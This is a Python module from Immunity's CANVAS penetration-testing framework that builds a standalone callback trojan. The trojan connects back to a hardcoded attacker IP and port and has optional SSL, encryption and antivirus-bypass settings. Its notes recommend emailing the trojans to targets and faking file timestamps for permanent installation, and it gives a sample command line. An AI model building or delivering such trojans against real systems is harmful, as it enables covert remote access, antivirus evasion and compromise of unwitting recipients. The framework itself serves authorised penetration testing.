#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import time
from exploitutils import *

NAME                = "BuildCallbackTrojan"
DESCRIPTION         = "Creates an executable that will call back to MOSDEF"

NOTES               = """

This creates the equivalent of a MOSDEF Callback trojan which has a hardcoded
callback port and IP address.

It supports Windows, Linux, and any other platform MOSDEF supports where we
support the file format (NOT AIX).  HTTP MOSDEF is only supported on
Windows, for now. The filename can be anything you like, although under
Windows we suggest something ending in .exe.

These files may be blocked by antivirus heuristics (for example, as _Bloodhound_
or another generic signature) and are quite small files. You may want to use
touchfromfile to set the timestamp on these files if you're installing it permanently.
It's your responsibility to actually upload and execute these files.

Trojans created in this way take no arguments as these are hardcoded when you create
them. Hence, they're useful for emailing to targets, etc.


Commandline Example:
exploits/trojan/BuildCallbackTrojan/BuildCallbackTrojan.py -t 0.0.0.0 -O callback_host:192.168.1.1 -O callback_port:5555 -O OS:Windows -O filename:cow.dll
"""

DOCUMENTATION          =  {}
DOCUMENTATION["Notes"] = NOTES
VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['TYPE']       = "Trojans"

from libs.canvasos import *
from ExploitTypes.utility import Utility

class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.filename       = "trojan.bin"
        self.callback_host  = None
        self.callback_port  = 5555
        self.OS             = "Linux"
        self.ARCH           = "X86"
        self.HTTP           = False
        self.SSL            = False
        self.Universal      = False
        self.encrypted      = False
        self.av_bypass      = False

    def getargs(self):
        self.getarg("filename") #output filename
        self.getarg("callback_host")
        self.getarg("callback_port")
        self.getarg("OS")
        self.getarg("ARCH")
        self.getarg("HTTP")
        self.getarg("Universal")
        self.HTTP = int(self.HTTP)
        self.getarg("SSL")
        self.getarg("encrypted")
        self.getarg("av_bypass")

        self.SSL = int(self.SSL)
        if self.OS == 'Mac OS X':
            self.OS = "OSX"

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))

        t_os        = canvasos(self.OS)
        t_os.arch   = self.ARCH
        # print "**",self.OS,len(self.OS),self.ARCH,len(self.ARCH),len(str(t_os))
        # these set self.mosdeftrojan with the binary data ..
        self.log("Building MOSDEF trojan for: %s %s" % (t_os, t_os.arch))
        self.log('Universal: %s' % self.Universal)
        self.log('Encrypted: %s' % self.encrypted)
        self.log('AV bypass: %s' % self.av_bypass)

        try:
            ret = self.buildmosdeftrojan(self.callback_host,
                                         self.callback_port,
                                         target_os=t_os,
                                         http=self.HTTP,
                                         ssl=self.SSL,
                                         universal=self.Universal,
                                         encrypted=self.encrypted,
                                         av_bypass=self.av_bypass,
                                         win8_compatible=True)
        except Exception, err:
            import traceback
            traceback.print_exc()
            self.log("Problem building the MOSDEF trojan: %s"%(err))
            self.setInfo("%s - failed" % (NAME))
            return 0

        if not ret:
            ##Something meant we could not build it - weird OS/Arch combi etc
            self.log("Build MOSDEF trojan returned %s which indicates failure"%(ret))
            self.setInfo("%s - failed" % (NAME))
            return 0

        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.filename))
        file(self.filename,"wb").write(self.mosdeftrojan)
        self.setInfo("%s - done" % (NAME))
        return len(self.mosdeftrojan) != 0

if __name__=="__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
